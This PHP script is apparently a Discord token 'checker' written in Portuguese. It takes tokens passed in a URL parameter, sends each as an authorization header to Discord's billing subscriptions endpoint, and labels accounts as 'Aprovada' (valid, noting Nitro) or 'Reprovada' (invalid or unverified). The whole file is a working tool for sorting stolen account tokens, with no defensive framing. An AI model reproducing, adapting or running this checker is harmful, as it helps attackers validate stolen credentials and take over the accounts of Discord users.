<?php

///// Api Atualizada 2023 By Haika <3

error_reporting(0);


$lista = $_GET['lista'];

$headers = [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: '.$lista.'',
    'content-type: application/json',
    'origin: https://discord.com',
    'referer: https://discord.com/channels/@me',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
];

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://discord.com/api/v9/users/@me/billing/subscriptions',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => 'GET',
    CURLOPT_HTTPHEADER => $headers,
));

$response = curl_exec($ch);

if(stripos($response, 'Voc\u00ea precisa verificar sua conta para realizar esta a\u00e7\u00e3o.')){
  echo '<br>@ Reprovada => ['.$lista.'] => [Voce Precisa Verificar] => [Haika]';
  return;
}
if(stripos($response, '401: Unauthorized')){
  echo '<br>@ Reprovada => ['.$lista.'] => [Token Invalido] => [Haika]';
  return;
}
if (trim($response) == '[]') {
  echo '<br>@ Aprovada => ['.$lista.'] => [Logado Com Sucesso] => [Haika]';
  return;
}
if(stripos($response, 'id')){
  echo '<br>@ Aprovada => ['.$lista.'] => [Logado Com Sucesso (Conta Boa Com Nitro)] => [Haika]';
  return;
}
if(is_null($response)){
  echo '<br>@ Reprovada => ['.$lista.'] => [Api Não Retornou] => [Haika]';
  return;
}
else{
  echo '<br>@ Reprovada => ['.$lista.'] => [Erro Desconhecido] => [Haika]';
  return;
}

?>
